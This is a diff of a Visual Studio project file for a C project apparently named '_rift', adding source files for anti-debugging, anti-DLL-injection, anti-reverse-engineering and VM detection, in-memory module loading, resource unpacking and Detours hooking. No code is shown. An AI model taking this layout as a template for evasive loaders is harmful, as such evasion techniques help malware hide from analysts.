@@ -99,7 +99,7 @@
     </ResourceCompile>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClInclude Include="config.h" />
+    <ClInclude Include="detours.h" />
     <ClInclude Include="MemoryModule.h" />
     <ClInclude Include="pch.h" />
     <ClInclude Include="resource.h" />
@@ -107,23 +107,25 @@
     <ClInclude Include="_rift_shared.h" />
   </ItemGroup>
   <ItemGroup>
-    <ClCompile Include="AntiRE.c" />
+    <ClCompile Include="AntiDllInject.c" />
+    <ClCompile Include="AntiDebug.c" />
     <ClCompile Include="Console.c" />
     <ClCompile Include="CRC32.c" />
-    <ClCompile Include="Data.c" />
+    <ClCompile Include="FileSystem.c" />
     <ClCompile Include="MemoryModule.c">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">NotUsing</PrecompiledHeader>
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">NotUsing</PrecompiledHeader>
     </ClCompile>
     <ClCompile Include="NT.c" />
+    <ClCompile Include="AntiRE.c" />
     <ClCompile Include="pch.c">
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
       <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
     </ClCompile>
     <ClCompile Include="main.c" />
-    <ClCompile Include="Process.c" />
+    <ClCompile Include="Random.c" />
     <ClCompile Include="Registry.c" />
-    <ClCompile Include="UnPackRes.c" />
+    <ClCompile Include="UnpackRes.c" />
     <ClCompile Include="VMDetect.c" />
     <ClCompile Include="Xoshiro128.c" />
   </ItemGroup>
@@ -132,6 +134,9 @@
   </ItemGroup>
   <ItemGroup>
     <Image Include="..\_riftIcon\_rift.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <Library Include="detours.lib" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
